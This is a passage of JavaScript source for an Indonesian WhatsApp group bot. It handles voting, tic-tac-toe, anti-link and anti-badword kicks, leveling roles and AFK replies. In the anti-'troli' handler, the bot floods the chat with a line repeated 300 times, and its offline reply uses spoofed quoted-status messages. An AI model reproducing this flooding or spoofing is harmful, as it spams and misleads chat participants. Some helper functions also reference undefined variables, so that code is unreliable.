                let mime = ""
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        mime = res.headers['content-type']
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, filename, async function () {
                    console.log('done');
                    let media = fs.readFileSync(filename)
                    let type = mime.split("/")[0]+"Message"
                    if(mime === "image/gif"){
                        type = MessageType.video
                        mime = Mimetype.gif
                    }
                    if(mime.split("/")[0] === "audio"){
                        mime = Mimetype.mp4Audio
                    }
                    Zeeone.sendMessage(to, media, type, { quoted: Ofc, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
                    
                    fs.unlinkSync(filename)
                });
            } 
       async function sendFileFromUrl(from, url, caption, Ofc, men) {
            let mime = '';
            let res = await axios.head(url)
            mime = res.headers['content-type']
            let type = mime.split("/")[0]+"Message"
            if(mime.split("/")[0] === "gif"){
                return Zeeone.sendMessage(from, await getBuffer(url), MessageType.video, {caption: caption, quoted: Ofc, gifPlayback: true, mimetype: 'video/mp4', contextInfo: {"mentionedJid": men ? men : []}})
            }
            if(mime === "application/pdf"){
                type = MessageType.document
                mime = Mimetype.pdf
                return Zeeone.sendMessage(from, await getBuffer(url), type, {caption: caption, quoted: Ofc, mimetype: mime, contextInfo: {"mentionedJid": men ? men : []}})
            }
            if(mime.split("/")[0] === "audio"){
            	type = MessageType.audio
                mime = Mimetype.mp4Audio
                return Zeeone.sendMessage(from, await getBuffer(url), type, {caption: caption, quoted: Ofc, mimetype: mime, contextInfo: {"mentionedJid": men ? men : []}})
            }
            if(mime.split("/")[0] === "video"){
            	type = MessageType.video
                mime = 'video/mp4'
                return Zeeone.sendMessage(from, await getBuffer(url), type, {caption: caption, quoted: Ofc, mimetype: mime, contextInfo: {"mentionedJid": men ? men : []}})
            }
            if(mime.split("/")[0] === "image"){
            	return Zeeone.sendMessage(from, await getBuffer(url), image, {caption: caption, quoted: Ofc, contextInfo: {"mentionedJid": men ? men : []}})
            }
                }
        const textImg = (teks) => {
            return Zeeone.sendMessage(from, teks, text, {quoted: Ofc, thumbnail: thumbnail})
        }
        const sendStickerUrl = async(to, url) => {
			console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading sticker...'))
				var names = getRandom('.webp')
				var namea = getRandom('.png')
				var download = function (uri, filename, callback) {
					request.head(uri, function (err, res, body) {
						request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
					});
				};
				download(url, namea, async function () {
					let filess = namea
					let asw = names
					require('./lib/exif.js')
					exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
					exec(`webpmux -set exif ./src/sticker/data.exif ${asw} -o ${asw}`, async (error) => {
					let media = fs.readFileSync(asw)
					Zeeone.sendMessage(to, media, sticker, Ofc)
					console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Succes send sticker...'))
					});
					});
				});
			}
			
			const sendFile = async(link, type, options) => {
				hasil = await getBuffer(link)
				Zeeone.sendMessage(from, hasil, type, options).catch(e => {
					fetch(link).then((hasil) => {
						Zeeone.sendMessage(from, hasil, type, options).catch(e => {
							Zeeone.sendMessage(from, { url : link }, type, options).catch(e => {
								reply('Error!')
								console.log(e)
							})
						})
					})
				})
			}
					if(isGroup && !isVote) {
							if (budy.toLowerCase() === 'vote'){
								let vote = JSON.parse(fs.readFileSync(`./database/voting/pvote/${from}.json`))
								let _votes = JSON.parse(fs.readFileSync(`./database/voting/vote/${from}.json`))  
								let fil = vote.map(v => v.participant)
								let id_vote = sender ? sender : `${owner_number}@s.whatsapp.net`
								if(fil.includes(id_vote)) {
									return mentions('@'+sender.split('@')[0]+' Anda sudah vote', fil, true)
									} else {
										vote.push({
											participant: id_vote,
											voting: '✅'
										})
										fs.writeFileSync(`./database/voting/pvote/${from}.json`,JSON.stringify(vote))
										let _p = []
										let _vote = `「   VOTING  」\n\n*Vote* @${_votes[0].votes.split('@')[0]}\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit` 
										for(let i = 0; i < vote.length; i++) {
											_vote +=  `@${vote[i].participant.split('@')[0]}\n*Vote* : ${vote[i].voting}`
											_p.push(vote[i].participant)
										}  
										_p.push(_votes[0].votes)
										mentions(_vote,_p,true)   
									}
								} else if (budy.toLowerCase() === 'devote'){
									const vote = JSON.parse(fs.readFileSync(`./database/voting/pvote/${from}.json`))
									let _votes = JSON.parse(fs.readFileSync(`./database/voting/vote/${from}.json`))  
									let fil = vote.map(v => v.participant)
									let id_vote = sender ? sender : `${owner_number}@s.whatsapp.net`
									if(fil.includes(id_vote)) {
										return mentions('@'+sender.split('@')[0]+' Anda sudah vote', fil, true)
										} else {
											vote.push({
												participant: id_vote,
												voting: '❌'
											})
										fs.writeFileSync(`./database/voting/pvote/${from}.json`,JSON.stringify(vote))
										let _p = []
										let _vote = `「   VOTING  」\n\n*Vote* @${_votes[0].votes.split('@')[0]}\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit` 
										for(let i = 0; i < vote.length; i++) {
											_vote +=  `@${vote[i].participant.split('@')[0]}\n*Vote* : ${vote[i].voting}`
											_p.push(vote[i].participant)
											}  
											_p.push(_votes[0].votes)
											mentions(_vote,_p,true)   
											}
										}
									}
					const getWin = async(board) => {
    var x = ["❌"]
    var o = ["⭕️"]

    // Horizontal
    if (board[0] == x && board[1] == x && board[2] == x) return x
    if (board[3] == x && board[4] == x && board[5] == x) return x
    if (board[6] == x && board[7] == x && board[8] == x) return x
    if (board[0] == o && board[1] == o && board[2] == o) return o
    if (board[3] == o && board[4] == o && board[5] == o) return o
    if (board[6] == o && board[7] == o && board[8] == o) return o

    // Silang
    if (board[0] == x && board[4] == x && board[8] == x) return x
    if (board[2] == x && board[4] == x && board[6] == x) return x
    if (board[0] == o && board[4] == o && board[8] == o) return o
    if (board[2] == o && board[4] == o && board[6] == o) return o

    // Vertikal
    if (board[0] == x && board[3] == x && board[6] == x) return x
    if (board[1] == x && board[4] == x && board[7] == x) return x
    if (board[2] == x && board[5] == x && board[8] == x) return x
    if (board[0] == o && board[3] == o && board[6] == o) return o
    if (board[1] == o && board[4] == o && board[7] == o) return o
    if (board[2] == o && board[5] == o && board[8] == o) return o
    return false
}

// function for generate board for x and o or number
const generateBoard = async(board) => {
    var texts = ""
    var count = 0
    for (var x of board) {
        if (count % 3 == 0) {
            texts += "\n               "
        }
        texts += x
        count += 1
    }
    return texts
}
const checkWin = (sender) => {
            let found = false
            for (let wn of _win) {
                if (wn.jid === sender) {
                    let winCounts = winawal - wn.win
                    if (winCounts <= 0) return Zeeone.sendMessage(from, `Anda belum pernah memainkan game tictactoe${enter}${enter}Jumlah kemenangan kamu didalam game *tictactoe* adalah: ${winCounts}`, text, { quoted: Ofc })
                    return `${winCounts}`
                    found = true
                }
            }
            if (found === false) {
                let obj = { jid: sender, win: 0 }
                _win.push(obj)
                fs.writeFileSync('./database/tttwin.json', JSON.stringify(_win))
                return `${winCounts}`
            }
        }
        const checkLose = (sender) => {
            let found = false
            for (let ls of _lose) {
                if (ls.jid === sender) {
                    let loseCounts = loseawal - ls.lose
                    if (loseCounts <= 0) return Zeeone.sendMessage(from, `Anda belum pernah memainkan game tictactoe${enter}${enter}Jumlah kemenangan kamu didalam game *tictactoe* adalah: ${winCounts}`, text, { quoted: Ofc })
                    return `${loseCounts}`
                    found = true
                }
            }
            if (found === false) {
                let obj = { jid: sender, lose: 0 }
                _lose.push(obj)
                fs.writeFileSync('./database/tttlose.json', JSON.stringify(_lose))
                return `${loseCounts}`
            }
        }
        if (tictactoe.hasOwnProperty(senderNumber) && ["Nyerah", "nyerah", "give up"].includes(budy) && !isCmd) {
        orangnye = sender
        teks = `@${orangnye.split("@")[0]} Menyerah${enter}_Yahaha_`
        return Zeeone.sendMessage(from, teks, text, {quoted:Ofc, contextInfo:{mentionedJid: [orangnye]}}).then(() => {
                        delete tictactoe[senderNumber]
                        fs.writeFileSync("./database/tictactoe.json", JSON.stringify(tictactoe))
                        fs.unlinkSync("./database/user/" + from + ".json");
        })
        }
       
        if (tictactoe.hasOwnProperty(senderNumber) && ["1", "2", "3", "4", "5", "6", "7", "8", "9"].includes(budy) && !isCmd) {
            var { enemy, mode, board, step } = tictactoe[senderNumber]
            if ([X, O].includes(board[Number(budy) - 1])) return await reply(`Angka ${budy} telah diisi`)
            var data = tictactoe[senderNumber]
            data["enemy"] = senderNumber
            mode = mode == X ? O : X
            data["mode"] = mode
            data["board"][Number(budy) - 1] = data["mode"]
            data["step"] += 1
            var player1 = enemy
            var player2 = senderNumber
            if (step % 2 == 0) {
                player1 = senderNumber
                player2 = enemy
            } else {
                mode = data["mode"] == X ? O : X
            }
            tictactoe[enemy] = data
            delete tictactoe[senderNumber]
            var teks = `🎮🎭 ${petik}TICTACTOE${petik} 🎭🎮${enter}•> Player 1 : @${player1.split("@")[0]} (${mode})`
            mode = mode == X ? O : X
            var text2 = `${enter}${enter}•> Player 2 : @${player2.split("@")[0]} (${mode})`
            var test = `${enter}_ketik nyerah untuk menyerah_`
            board = await generateBoard(data["board"])
            var win = await getWin(data["board"])
            if (win) {
                teks = `🎮🎭 ${petik}TICTACTOE${petik} 🎭🎮${enter}`
                if (win == mode) {
                    teks += `•> Lose : @${player1} 👻${enter}${enter}`
                    teks += board
                    teks += `${enter}${enter}•> Win : @${player2} 🎉${enter}_© WhatsApp Bot_`
                    return Zeeone.sendMessage(from, teks, text, {quoted:Ofc, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
                        delete tictactoe[enemy]
                        fs.writeFileSync("./database/tictactoe.json", JSON.stringify(tictactoe))
                        fs.unlinkSync('./database/user/' + from + '.json')
                        getWins(`${player2}@s.whatsapp.net`, 1)
                        getLose(`${player1}@s.whatsapp.net`, 1)
                    })
                } else {
                    teks += `•> Win : @${player1} 🎉${enter}${enter}`
                    teks += board
                    teks += `${enter}${enter}•> Lose : @${player2} 👻${enter}_© WhatsApp Bot_`
                    return Zeeone.sendMessage(from, teks, text, {quoted:Ofc, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
                        delete tictactoe[enemy]
                        fs.writeFileSync("./database/tictactoe.json", JSON.stringify(tictactoe))
                        fs.unlinkSync('./database/user/' + from + '.json')
                        getWins(`${player1}@s.whatsapp.net`, 1)
                        getLose(`${player2}@s.whatsapp.net`, 1)
                    })
                }
            }
            if (data["step"] == 9) {
                teks = `🎮🎭 ${petik}TICTACTOE${petik} 🎭🎮${enter}`
                teks += `•> Draw : @${player1} 🦁${enter}${enter}`
                teks += board
                teks += `${enter}${enter}•> Draw : @${player2} 🐯${enter}_© WhatsApp Bot_`
                return Zeeone.sendMessage(from, teks, text, {quoted:Ofc, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
                    delete tictactoe[enemy]
                    fs.writeFileSync("./database/tictactoe.json", JSON.stringify(tictactoe))
                    fs.unlinkSync('./database/user/' + from + '.json')
                })
            }
            player2 == senderNumber ? teks += tunjuk : text2 += tunjuk
            teks += "\n"
            teks += board
            teks += text2
            teks += test
            return Zeeone.sendMessage(from, teks, text, {quoted:Ofc, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
                fs.writeFileSync("./database/tictactoe.json", JSON.stringify(tictactoe))
            })
        }
        if (fs.existsSync(`./temp/${from}.json`)) {
	tttSkuy = setTtt(`${from}`)
	if (sender == `${tttSkuy.Y}@s.whatsapp.net` && budy.toLowerCase() == 'y') {
		if (tttSkuy.status) return reply(`Game telah dimulai sebelumnya!`)
		tttSkuy.status = true
		rand0m = [ tttSkuy.Z, tttSkuy.Y ]
		winR = rand0m[Math.floor(Math.random() * rand0m.length)]
		fs.writeFileSync(`./temp/${from}.json`, JSON.stringify(tttSkuy, null, 2))
		nantang = O
                    pelawan = X
                
                var board = ["1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣"]
                var penantang = `${tttSkuy.Z}@s.whatsapp.net`
                var lawan = `${tttSkuy.Y}@s.whatsapp.net`
                tesk = `🎮🎭 ${petik}TICTACTOE${petik} 🎭🎮${enter}•> Player 1 : @${penantang.split("@")[0]} (${nantang}) ${tunjuk}${enter}`
                var count = 0
                for (var x of board) {
                    if (count % 3 == 0) {
                        tesk += "\n               "
                    }
                    tesk += x
                    count += 1
                }
                tesk += `${enter}${enter}•> Player 2 : @${lawan.split("@")[0]} (${pelawan})${enter}_© WhatsApp Bot_`
                return Zeeone.sendMessage(from, tesk, text, {quoted:Ofc, contextInfo:{mentionedJid: [penantang, lawan]}}).then(() => {
                    var data = {}
                    data["enemy"] = lawan.split("@")[0]
                    data["mode"] = pelawan
                    data["board"] = board
                    data["step"] = 0
                    tictactoe[penantang.split("@")[0]] = data
                    fs.writeFileSync("./database/tictactoe.json", JSON.stringify(tictactoe))
                })
                fs.unlinkSync("./database/user/" + from + ".json");
	} else if (sender == `${tttSkuy.Y}@s.whatsapp.net` &&  budy.toLowerCase() == 'n') {
		Zeeone.sendMessage(from, `「 *GAME TICTACTOE REJECTED* 」\n\n• @${tttSkuy.Y} yahaha wahyu`, text, {quoted: Ofc, contextInfo: { mentionedJid: [tttSkuy.Y + "@s.whatsapp.net"]}})
		fs.unlinkSync("./database/user/" + from + ".json");
	}
}
					if (isGroup && isAntro && m.message && m.isBaileys && m.quoted && m.quoted.mtype === 'orderMessage' && !(m.quoted.token && m.quoted.orderId)) {
						reply(`Troli Detected\n` + require('util').format(m.key))
						Zeeone.sendMessage(from, '*TANDAI TELAH DI BACA!!*\n'.repeat(300), text)
						await Zeeone.modifyChat(m.chat, 'delete', {
							includeStarred: false
						})
					}
					
			const sendButMessage = async (id, text1, desc1, but = [], options = {}) => {
					buttonMessage = {
						contentText: text1,
						footerText: desc1,
						buttons: but,
						headerType: 1,
						};
						Zeeone.sendMessage(
						id,
						buttonMessage,
						MessageType.buttonsMessage, options
						);
						};
			const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
					kma = gam1
					const mediaxpxaa = await Zeeone.prepareMessage(id, kma, MessageType.location, {thumbnail: kma})
					mhan = mediaxpxaa.message["ephemeralMessage"] ? mediaxpxaa.message.ephemeralMessage : mediaxpxaa
					//mhan = await Zeeone.prepareMessage(id, kma, MessageType.location, {thumbnail:kma})
					buttonMessages = {
						locationMessage: mhan.message.locationMessage,
						contentText: text1,
						footerText: desc1,
						buttons: but,
						headerType: 6
						}
						Zeeone.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
						}
				const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {
					kma = vid1
					const mediaxxaa = await Zeeone.prepareMessage(id, kma, MessageType.video)
					mhan = mediaxxaa.message["ephemeralMessage"] ? mediaxxaa.message.ephemeralMessage : mediaxxaa
					//mhan = await Zeeone.prepareMessage(from, kma, video)
					const buttonMessages = {
						videoMessage: mhan.message.videoMessage,
						contentText: text1,
						footerText: desc1,
						buttons: but,
						headerType: 5
						}
						Zeeone.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
					}
				const sendButImage = async (id, text1, desc1, gam1, but = [], options = {}) => {
					kma = gam1
					const mediaxxaga = await Zeeone.prepareMessage(id, kma, MessageType.video)
					mhan = mediaxxaga.message["ephemeralMessage"] ? mediaxxaga.message.ephemeralMessage : mediaxxaga
					//mhan = await Zeeone.prepareMessage(id, kma, MessageType.image, {thumbnail:kma})
					buttonMessages = {
						imageMessage: mhan.message.imageMessage,
						contentText: text1,
						footerText: desc1,
						buttons: but,
						headerType: 4
						}
						Zeeone.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
						}
					if(isCmd && isBanned) return sendButMessage(from, `Maaf Nomor Kamu Telah Di Banned. Silahkan Hubungi Owner Untuk Membuka Banned Kamu`, `Klik Button Di Bawah !`, [{buttonId: `owner`,buttonText: {displayText: `👨‍💻 Owner`,},type: 1,}]);
					for (let setikerr of setiker){
						if (budy === setikerr){
						buffer = fs.readFileSync(`./database/stick/${setikerr}.webp`)
						Zeeone.sendMessage(from, buffer, sticker, {quoted: Ofc})
						}
					}
					for (let audionyee of audionye){
						if (budy === audionyee){
						buffer = fs.readFileSync(`./database/audio/${audionyee}.mp3`)
						Zeeone.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', quoted: Ofc, ptt: true })
						}
					}
					for (let imagenyee of imagenye){
						if (budy === imagenyee){
						buffer = fs.readFileSync(`./database/image/${imagenyee}.jpg`)
						Zeeone.sendMessage(from, buffer, image, {quoted: Ofc })
						}
					}
					for (let videonyee of videonye){
						if (budy === videonyee){
						buffer = fs.readFileSync(`./database/video/${videonyee}.mp4`)
						Zeeone.sendMessage(from, buffer, video, {quoted: Ofc })
						}
					}
					if (isGroup && isAntiLink && !isOwner && !isGroupAdmins && isBotGroupAdmins){
						if (budy.match(/(https:\/\/chat.whatsapp.com)/gi)) {
							sendButMessage(from, ` *GROUP LINK DETECTED*\n\nMaaf Kamu Akan Di Kick Dari Group Ini!`, `Klik Di Bawah Untuk Mematikan`, [
							{
							buttonId: `antilink off`,
							buttonText: {
								displayText: `🔖 DISABLE ANTILINK`,
								},
								type: 1,
								}]);
							Zeeone.groupRemove(from, [sender])
						}
					}
					/*if (budy.length > 10000) {
						if(!Ofc.key.fromMe) return
						if (m.isBaileys) return
							Zeeone.modifyChat(m.chat, 'delete', {
							includeStarred: false
						})
						Zeeone.sendMessage(from, `「 *VIRTEX DETECTED* 」 `, text, {quoted: Ofc})
						Zeeone.sendMessage(from, '*TANDAI TELAH DI BACA!!*\n'.repeat(300), text)
					}*/
					if (!m.isBaileys && isGroup && isBadword && !isOwner && !isGroupAdmins && !Ofc.key.fromMe){
						for (let kasar of badword){
							if (chats.toLowerCase().includes(kasar)){
								if (isCountKasar(sender, senbadword)){
									if (!isBotGroupAdmins) return reply(`Kamu beruntung karena bot bukan admin`)
									sendButMessage(from, `*ANTI BADWORD*\n\nHai ${pushname}\nSepertinya kamu sudah berkata kasar lebih dari 2x, maaf kamu akan di kick`, `Klik Di Bawah Untuk Mematikan`, [
									{
										buttonId: `antibadword off`,
										buttonText: {
											displayText: `🔖 DISABLE ANTI BADWORD`,
											},
											type: 1,
											}]);
									Zeeone.groupRemove(from, [sender])
									delCountKasar(sender, senbadword)
									} else {
										addCountKasar(sender, senbadword)
										reply(`Kamu terdeteksi berkata kasar\nJangan ulangi lagi atau kamu akan dikick`)
									}
								}
							}
						}
						//Zeeone.chatRead(from, "read")
					_sewa.expiredCheck(Zeeone, sewa)
					
					const levelRole = getLevelingLevel(sender)
					var role = 'Bronze 1'
					if (levelRole <= 2) {
						role = 'Bronze 1'
						} else if (levelRole <= 10) {
							role = 'Bronze 2'
							} else if (levelRole <= 20) {
								role = 'Bronze 3'
								} else if (levelRole <= 30) {
									role = 'Bronze 4'
									} else if (levelRole <= 40) {
										role = 'Bronze 5'
										} else if (levelRole <= 70) {
											role = 'Silver 1'
											} else if (levelRole <= 85) {
												role = 'Silver 2'
												} else if (levelRole <= 95) {
													role = 'Silver 3'
													} else if (levelRole <= 105) {
														role = 'Silver 4'
														} else if (levelRole <= 125) {
															role = 'Silver 5'
															} else if (levelRole <= 150) {
																role = 'Gold 1'
																} else if (levelRole <= 170) {
																	role = 'Gold 2'
																	} else if (levelRole <= 190) {
																		role = 'Gold 3'
																		} else if (levelRole <= 210) {
																			role = 'Gold 4'
																			} else if (levelRole <= 230) {
																				role = 'Gold 5'
																				} else if (levelRole <= 260) {
																					role = 'Platinum 1'
																					} else if (levelRole <= 290) {
																						role = 'Platinum 2'
																						} else if (levelRole <= 320) {
																							role = 'Platinum 3'
																							} else if (levelRole <= 350) {
																								role = 'Platinum 4'
																								} else if (levelRole <= 380) {
																									role = 'Platinum 5'
																									} else if (levelRole <= 410) {
																										role = 'Diamond 1'
																										} else if (levelRole <= 450) {
																											role = 'Diamond 2'
																											} else if (levelRole <= 500) {
																												role = 'Diamond 3'
																												} else if (levelRole <= 550) {
																													role = 'Diamond 4'
																													} else if (levelRole <= 600) {
																														role = 'Diamond 5'
																														} else if (levelRole <= 700) {
																															role = 'Master'
																															} else if (levelRole <= 800) {
																															role = 'Master ✩'
																														} else if (levelRole <= 900) {
																													role = 'Master ✩✩'
																												} else if (levelRole <= 1000) {
																											role = 'Master ✩✩✩'
																										} else if (levelRole <= 1100) {
																									role = 'Master ✯'
																								} else if (levelRole <= 1225) {
																							role = 'Master ✯✯'
																						} else if (levelRole <= 1340) {
																					role = 'Master ✯✯✯'
																				} else if (levelRole <= 1400) {
																			role = 'GrandMaster'
																		} else if (levelRole <= 1555) {
																	role = 'GrandMaster ✩'
																} else if (levelRole <= 1660) {
															role = 'GrandMaster ✩✩'
														} else if (levelRole <= 1710) {
													role = 'GrandMaster ✩✩✩'
												} else if (levelRole <= 1825) {
											role = 'GrandMaster ✯'
										} else if (levelRole <= 1950) {
									role = 'GrandMaster ✯✯'
								} else if (levelRole <= 2000) {
							role = 'GrandMaster ✯✯✯'
						} else if (levelRole <= 2220) {
					role = 'Legends'
				} else if (levelRole <= 2500) {
					role = 'Legends 2'
					} else if (levelRole <= 2700) {
						role = 'Legends 3'
						} else if (levelRole <= 2900) {
							role = 'Legends 4'
							} else if (levelRole <= 3100) {
								role = 'Legends 5'
								} else if (levelRole <= 3300) {
									role = 'Legends 6'
									} else if (levelRole <= 3600) {
										role = 'Legends 7'
										} else if (levelRole <= 3900) {
											role = 'Legends 8'
											} else if (levelRole <= 4200) {
												role = 'Legends 9'
												} else if (levelRole <= 4450) {
													role = 'Legends 10'
													} else if (levelRole <= 4700) {
														role = 'Legends 忍'
														} else if (levelRole <= 4900) {
															role = 'Legends 忍¹'
															} else if (levelRole <= 5100) {
																role = 'Legends 忍²'
																} else if (levelRole <= 5600) {
																	role = 'Legends 忍³'
																	} else if (levelRole <= 6100) {
																		role = 'Legends 忍⁴'
																		} else if (levelRole <= 7000) {
																			role = 'GrandLegends'
																			} else if (levelRole <= 10000) {
																				role = 'GrandLegends 1'
																				} else if (levelRole <= 20000) {
																					role = 'GrandLegends 2'
																					} else if (levelRole <= 30000) {
																						role = 'GrandLegends 3'
																						} else if (levelRole <= 40000) {
																							role = 'GrandLegends 4'
																							} else if (levelRole <= 50000) {
																								role = 'GrandLegends 忍¹'
																								} else if (levelRole <= 60000) {
																									role = 'GrandLegends 忍²'
																									} else if (levelRole <= 70000) {
																										role = 'GrandLegends 忍³'
																										} else if (levelRole <= 80000) {
																											role = 'GrandLegends 忍⁴'
																											} else if (levelRole <= 90000) {
																												role = 'Pro 숒'
																												} else if (levelRole <= 99999999999999) {
																													role = 'Pro × GrandLegends 숒'
																												}
			for (var i = 0; i < cmdDB.length ; i++) {
						if (budy.toLowerCase() === cmdDB[i].commands) {
							Zeeone.sendMessage(from, `${cmdDB[i].jawaban}`, text, {quoted:Ofc, thumbnail: thumbnail})
						}
					}
					if (isGroup && !m.isBaileys) {
						if (mentionUser.length !== 0){
							for (let ment of mentionUser) {
								if (afk.checkAfkUser(ment, _afk)) {
									const getId = afk.getAfkId(ment, _afk)
									const getReason = afk.getAfkReason(getId, _afk)
									const getTime = Date.now() - afk.getAfkTime(getId, _afk)
									const heheh = ms(getTime)
									reply(`AFK MODE\n\n@${ment.split('@')[0]} sedang afk\n\n*Alasan :* ${getReason}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu`)
								}
							}
						}
					if (afk.checkAfkUser(sender, _afk)) {
						const getId = afk.getAfkId(sender, _afk)
						const reason = afk.getAfkReason(sender, _afk)
						const getTime = Date.now() - afk.getAfkTime(getId, _afk)
						const heheh = ms(getTime)
						_afk.splice(afk.getAfkPosition(sender, _afk), 1)
						reply(`@${sender.split("@")[0]} telah kembali afk setelah *${reason}*\nSejak : ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik yang lalu\n\nselamat datang kembali`)
						fs.writeFileSync('./database/afk.json', JSON.stringify(_afk))
					}
				}
					if (isGroup && isUser && !isCmd) {
						const currentLevel = getLevelingLevel(sender)
						const checkId = getLevelingId(sender)
						try {
							if (currentLevel === undefined && checkId === undefined) addLevelingId(sender)
							const amountXp = Math.floor(Math.random() * 10) + 50
							const requiredXp = 3000 * (Math.pow(2, currentLevel) - 1)
							const getLevel = getLevelingLevel(sender)
							addLevelingXp(sender, amountXp)
							if (requiredXp <= getLevelingXp(sender)) {
								addLevelingLevel(sender, 1)
								addBalance(sender, 30, balance)
								reply(`* 「 LEVEL UP 」 *\n\n🎯 *User :* @${sender.split("@")[0]}\n🆔 *Nomer :* ${sender.split("@")[0]}\n📊 *Xp :* ${getLevelingXp(sender)}\n💹 *Level :* ${getLevel} > ${getLevelingLevel(sender)}\n💳 *Balance :* $${getBalance(sender, balance)}*\n📛 *Role :* ${role}\n\nCongrats 🎉`)
								}
							} catch (err) {
								console.error(err)
							}
						}
    if (isCmd && msgFilter.isFiltered(from) && !isGroup) {
						console.log(color('[CMD]','magenta'), color(moment(Ofc.messageTimestamp * 1000).format('DD/MM/YYYY | HH:mm:ss'), 'white'), color(`${command}`,'magenta'), 'from', color(`${sender.split("@")[0]}`,'green'))
						return reply('Jangan Spam Lord')
						} 
					if (isCmd && msgFilter.isFiltered(from) && isGroup) {
						console.log(color('[CMD]','magenta'), color(moment(Ofc.messageTimestamp * 1000).format('DD/MM/YYYY | HH:mm:ss'), 'white'), color(`${command}`,'magenta'), 'from', color(`${sender.split("@")[0]}`,'green'))
						return reply('Jangan Spam Lord')
					}
    if (autovn){
						await Zeeone.updatePresence(from, Presence.recording)
						} else if (ngetik){
							await Zeeone.updatePresence(from, Presence.composing)
							} else {
								await Zeeone.updatePresence(from, Presence.avaible)
							}
			
			cekafk(_off)
            if (!Ofc.key.remoteJid.endsWith('@g.us') && offline){
            if (!Ofc.key.fromMe){
            if (isAfk(Ofc.key.remoteJid)) return
            addafk(Ofc.key.remoteJid)
            heheh = ms(Date.now() - waktu) 
           sendButMessage(Ofc.key.remoteJid, `@${owner_number} Sedang Offline!\n\n*Alasan :* ${alasan}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, `© ${namabot}`, [
									{
										buttonId: `oke`,
										buttonText: {
											displayText: `Okay..`,
											},
											type: 1,
											}], {quoted: ftroli, contextInfo:{ mentionedJid: [`${owner_number}@s.whatsapp.net`]}});
           // Zeeone.sendMessage(Ofc.key.remoteJid,`@${owner_number} Sedang Offline!\n\n*Alasan :* ${alasan}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner_number}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': thumbnail}}}})
            }
            }   
        if (Ofc.key.remoteJid.endsWith('@g.us') && offline) {
        if (!Ofc.key.fromMe){
        if (Ofc.message.extendedTextMessage != undefined){
        if (Ofc.message.extendedTextMessage.contextInfo != undefined){
        if (Ofc.message.extendedTextMessage.contextInfo.mentionedJid != undefined){
        for (let ment of Ofc.message.extendedTextMessage.contextInfo.mentionedJid) {
        if (ment === `${owner_number}@s.whatsapp.net`){
        if (isAfk(Ofc.key.remoteJid)) return
        addafk(Ofc.key.remoteJid)
        heheh = ms(Date.now() - waktu)
        sendButMessage(Ofc.key.remoteJid, `@${owner_number} Sedang Offline!\n\n*Alasan :* ${alasan}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, `© ${namabot}`, [
									{
										buttonId: `mnu`,
										buttonText: {
											displayText: `Okey..`,
											},
											type: 1,
											}], {quoted : ftroli, contextInfo:{ mentionedJid: [`${owner_number}@s.whatsapp.net`]}});

   // Zeeone.sendMessage(Ofc.key.remoteJid,`@${owner_number} Sedang Offline!\n\n *Alasan :* ${alasan}\n *Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner_number}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': thumbnail}}}})
          }
        }
            }
          }
        }
      }
    }
    
//========================================================================================================================//
		colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
	    const isQuotedMsg = type === 'extendedTextMessage' && content.includes('Message')
	
